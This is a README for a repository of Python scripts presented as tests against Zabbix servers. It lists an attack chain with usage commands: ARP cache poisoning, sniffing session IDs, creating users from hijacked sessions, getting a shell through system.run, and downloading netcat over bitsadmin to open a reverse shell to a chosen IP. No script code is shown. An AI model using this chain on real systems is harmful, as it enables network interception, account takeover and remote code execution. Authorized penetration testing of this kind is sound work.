# zabbix_test
## this is some scripts for testing zabbix server

### Scripts
* zabbix_version_detect.py - detect version of Zabbix server
* zabbix_zbxsessionid_sniffer.py - catch zbx_sessionid after arp cache poison
* zabbix_user_create_by_zbxsessionid.py - create user by caught zbx_sessionid
* zabbix_host_scan_by_pyzabbix.py - scan hosts by created Zabbix user
* zabbix_shell_create_on_Linux.py - create shell via system.run and creds
* zabbix_bitsadmin_nc_download.py - download nc to winpc and run reverse shell
* arp_cache_poison_scapy.py - ARP cache poison implementation

### Usage (Python)
* python arp_cache_poison_scapy.py --interface eth0 --victim-ip 192.168.1.10 --router-ip 192.168.1.1
* python zabbix_version_detect.py --zab-page http://IP/zabbix/index.php
* python zabbix_zbxsessionid_sniffer.py
* python zabbix_user_create_by_zbxsessionid.py --api http://IP/zabbix/api_jsonrpc.php --zbx-sessionid <id> --user <user> --password <pass>
* python zabbix_host_scan_by_pyzabbix.py --api http://IP/zabbix/api_jsonrpc.php --user <user> --password <pass>
* python zabbix_shell_create_on_Linux.py --api http://IP/zabbix/api_jsonrpc.php --user <user> --password <pass> --host <host> --connect-ip <ip> --connect-port <port>
* python zabbix_bitsadmin_nc_download.py --api http://IP/zabbix/api_jsonrpc.php --user <user> --password <pass> --host <host> --download-ip <ip> --connect-ip <ip> --connect-port <port>
